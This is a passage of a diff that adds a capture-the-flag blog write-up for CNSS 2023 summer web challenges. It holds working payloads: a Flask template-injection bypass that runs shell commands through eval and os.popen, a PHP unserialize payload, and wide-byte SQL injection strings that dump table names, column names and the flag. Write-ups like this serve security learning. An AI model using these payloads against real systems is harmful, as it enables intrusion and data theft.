deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">Content-<span class="type">Type</span>: application/json</span><br><span class="line">Cookie: name=psych;password=<span class="number">111</span>;</span><br><span class="line">Authorization: Basic cHN5Y2g6MTEx</span><br><span class="line">Content-Length: <span class="number">45</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;   <span class="string">&quot;name&quot;</span>: <span class="string">&quot;psych&quot;</span>,</span><br><span class="line"><span class="string">&quot;password&quot;</span>:<span class="string">&quot;111&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Easy-CNSS-Feedback-Pre-alpha"><a href="#Easy-CNSS-Feedback-Pre-alpha" class="headerlink" title="[Easy] CNSS Feedback Pre-alpha"></a>[Easy] CNSS Feedback Pre-alpha</h2><p>flask框架，</p>
+<p>bypass</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">1</span>).__subclasses__()[<span class="string">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>](<span class="number">300</span>).__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Mid-ezunserialize"><a href="#Mid-ezunserialize" class="headerlink" title="[Mid]ezunserialize"></a>[Mid]ezunserialize</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?web=O%3A4%3A%22CNSS%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3Bs%3A17%3A%22%00CNSS%00i_want2_say%22%3Bs%3A28%3A%22%E2%80%AE%E2%81%A6fssmsl%E2%81%A9%E2%81%A6i_like_web%22%3Bs%3A11%3A%22%00%2A%00password%22%3Bs%3A3%3A%22ctf%22%3B%7D</span><br></pre></td></tr></table></figure>
+
+<h2 id="Mid-CNSS-Database-2-0"><a href="#Mid-CNSS-Database-2-0" class="headerlink" title="[Mid] CNSS Database 2.0"></a>[Mid] CNSS Database 2.0</h2><p>去年的宽字节注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag%df&#x27; or 1=1 union select 1,database()#</span><br></pre></td></tr></table></figure>
+
+<p>后续爆破同理了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag%df&#x27; union select 1,table_name from information_schema.tables where table_schema=database();#</span><br></pre></td></tr></table></figure>
+
+<p>fl4g_1s_h3re_oooo</p>
+<p>注意这里:引号被过滤，所以数据库和表名那里不能加引号</p>
+<p>改进：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag%df&#x27; union select 1,column_name from information_schema.columns where table_schema=database() and table_name=(select table_name from information_schema.tables where table_schema=database()limit 1,1);#</span><br></pre></td></tr></table></figure>
+
+<p>最终：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag%df&#x27; union select 1,fulage from fl4g_1s_h3re_oooo;#</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-CNSS-Database-1-0"><span class="toc-number">1.</span> <span class="toc-text">[Easy] CNSS Database 1.0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mid-Backdoor-%E2%85%A1"><span class="toc-number">2.</span> <span class="toc-text">[Mid] Backdoor Ⅱ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MID-Backdoor-%E2%85%A2"><span class="toc-number">3.</span> <span class="toc-text">[MID] Backdoor Ⅲ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">3.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">3.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc"><span class="toc-number">3.3.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.4.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Baby-SignIn"><span class="toc-number">4.</span> <span class="toc-text">[Baby]SignIn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Baby-Backdoor-1"><span class="toc-number">5.</span> <span class="toc-text">[Baby]Backdoor 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Baby-Webpack"><span class="toc-number">6.</span> <span class="toc-text">[Baby] Webpack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-Leak"><span class="toc-number">7.</span> <span class="toc-text">[Easy] Leak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-ezhttp"><span class="toc-number">8.</span> <span class="toc-text">[Easy] ezhttp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-CNSS-Feedback-Pre-alpha"><span class="toc-number">9.</span> <span class="toc-text">[Easy] CNSS Feedback Pre-alpha</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mid-ezunserialize"><span class="toc-number">10.</span> <span class="toc-text">[Mid]ezunserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mid-CNSS-Database-2-0"><span class="toc-number">11.</span> <span class="toc-text">[Mid] CNSS Database 2.0</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://p5ych2022.github.io/2023/09/16/CNSS-2023-summer-web-writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://p5ych2022.github.io/2023/09/16/CNSS-2023-summer-web-writeup/&text=CNSS_2023_Summer_Web_WriteUp_Partial"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://p5ych2022.github.io/2023/09/16/CNSS-2023-summer-web-writeup/&title=CNSS_2023_Summer_Web_WriteUp_Partial"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://p5ych2022.github.io/2023/09/16/CNSS-2023-summer-web-writeup/&is_video=false&description=CNSS_2023_Summer_Web_WriteUp_Partial"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CNSS_2023_Summer_Web_WriteUp_Partial&body=Check out this article: http://p5ych2022.github.io/2023/09/16/CNSS-2023-summer-web-writeup/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://p5ych2022.github.io/2023/09/16/CNSS-2023-summer-web-writeup/&title=CNSS_2023_Summer_Web_WriteUp_Partial"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://p5ych2022.github.io/2023/09/16/CNSS-2023-summer-web-writeup/&title=CNSS_2023_Summer_Web_WriteUp_Partial"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://p5ych2022.github.io/2023/09/16/CNSS-2023-summer-web-writeup/&title=CNSS_2023_Summer_Web_WriteUp_Partial"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://p5ych2022.github.io/2023/09/16/CNSS-2023-summer-web-writeup/&title=CNSS_2023_Summer_Web_WriteUp_Partial"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://p5ych2022.github.io/2023/09/16/CNSS-2023-summer-web-writeup/&name=CNSS_2023_Summer_Web_WriteUp_Partial&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://p5ych2022.github.io/2023/09/16/CNSS-2023-summer-web-writeup/&t=CNSS_2023_Summer_Web_WriteUp_Partial"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    psych
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
